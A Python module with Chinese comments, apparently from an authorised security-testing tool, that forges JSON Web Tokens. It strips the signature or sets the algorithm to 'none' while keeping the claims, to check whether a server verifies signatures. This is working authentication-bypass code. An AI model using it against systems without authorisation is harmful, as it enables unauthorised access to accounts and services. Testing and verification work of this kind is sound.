"""JWT 伪造（仅用于授权范围内的自测）。

只做两件最经典的"信任边界"实验，不碰密钥爆破：

- ``alg=none``：把 header 的 alg 改成 none 并丢掉签名。实现正确的库会拒收。
- ``strip``：保留原 alg，只把签名清空。验证签名的一侧应当拒收。

两种变体都不改 payload（claims），这样"接受与否"只取决于签名校验，
判定结果才干净——如果连 claims 都换掉，响应差异就分不清是签名没校验还是权限模型松。
"""
from __future__ import annotations

import base64
import json
from typing import Any, Dict, Tuple

from .errors import PayloadRejected

VARIANTS = ("none", "strip")


def b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def split_token(token: str) -> Tuple[Dict[str, Any], Dict[str, Any], str]:
    """拆成 (header, payload, signature)。不是 JWT 就抛 PayloadRejected。"""
    tok = token.strip()
    if tok.lower().startswith("bearer "):
        tok = tok[7:].strip()
    parts = tok.split(".")
    if len(parts) != 3:
        raise PayloadRejected("凭据不是三段式 JWT（段数 %d）" % len(parts))
    try:
        header = json.loads(b64url_decode(parts[0]).decode("utf-8"))
        payload = json.loads(b64url_decode(parts[1]).decode("utf-8"))
    except (ValueError, UnicodeDecodeError) as exc:
        raise PayloadRejected("JWT 解码失败：%s" % exc)
    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise PayloadRejected("JWT 的 header/payload 不是 JSON 对象")
    return header, payload, parts[2]


def describe(token: str) -> Dict[str, Any]:
    """只提取判定需要的元信息，绝不回传完整的 claims 值。"""
    header, payload, sig = split_token(token)
    return {
        "alg": str(header.get("alg", "")),
        "typ": str(header.get("typ", "")),
        "claim_keys": sorted(str(k) for k in payload.keys()),
        "has_exp": "exp" in payload,
        "sig_len": len(sig),
    }


def forge(token: str, variant: str = "none") -> str:
    """返回伪造后的完整 Authorization 值（保留原有的 Bearer 前缀与否按原样）。"""
    if variant not in VARIANTS:
        raise PayloadRejected("未注册的 JWT 变体：%s（可选 %s）" % (variant, list(VARIANTS)))
    raw = token.strip()
    prefix = ""
    if raw.lower().startswith("bearer "):
        prefix, raw = raw[:7], raw[7:].strip()
    header, payload, _sig = split_token(raw)
    if variant == "none":
        header = {k: v for k, v in header.items() if k != "alg"}
        header["alg"] = "none"
        sig = ""
    else:                                   # strip：算法不变，签名清空
        sig = ""
    body = "%s.%s" % (b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8")),
                      b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8")))
    return prefix + body + "." + sig


def is_jwt(token: str) -> bool:
    try:
        split_token(token)
        return True
    except PayloadRejected:
        return False
